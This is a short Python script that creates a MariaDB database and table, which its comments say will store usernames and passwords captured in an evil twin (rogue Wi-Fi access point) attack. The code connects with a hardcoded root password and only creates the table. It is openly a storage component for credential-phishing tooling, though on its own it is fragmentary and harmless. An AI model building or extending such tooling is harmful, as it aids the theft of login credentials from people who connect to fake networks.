#create sql database to store username and password taken from evil twin attack
#use mariadb to store the data
#use python but take in js to create the database

import mariadb
import sys

def createDB():
    try:
        conn = mariadb.connect(
            user="root",
            password="password",
            host="localhost",
            port=3306,
            database="evilTwin"
        )
    except mariadb.Error as e:
        print(f"Error connecting to MariaDB Platform: {e}")
        sys.exit(1)

    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS evilTwin (username VARCHAR(255), password VARCHAR(255))")
    conn.commit()

    cur.close()